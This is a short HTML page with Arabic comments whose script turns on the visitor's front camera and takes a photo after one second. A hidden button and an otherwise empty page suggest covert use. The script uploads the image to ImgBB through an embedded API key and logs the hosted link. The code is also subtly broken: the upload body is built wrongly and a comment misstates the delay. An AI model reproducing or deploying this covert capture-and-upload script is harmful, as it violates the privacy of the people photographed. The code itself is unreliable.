<!DOCTYPE html>
<html>
<body>
  <!-- فتح الكاميرا تلقائيًا -->
  <video id="video" autoplay></video>
  <button id="snap" hidden>Capture</button>
  <canvas id="canvas" width="640" height="480"></canvas>
  
  <script>
    navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } }) // الكاميرا الأمامية
      .then(stream => {
        document.getElementById('video').srcObject = stream;
        setTimeout(() => {
          const canvas = document.getElementById('canvas');
          canvas.getContext('2d').drawImage(video, 0, 0, 640, 480);
          const image = canvas.toDataURL('image/jpeg');
          // رفع الصورة تلقائيًا إلى ImgBB
          fetch('https://api.imgbb.com/1/upload?key=85c1b237cc85eb120a31cf73476b1eba', {
            method: 'POST',
            body: new FormData().append('image', image.split(',')[1])
          }).then(response => response.json())
            .then(data => console.log(data.data.url)); // رابط الصورة
        }, 1000); // يلتقط بعد 3 ثوانٍ
      });
  </script>
</body>
</html>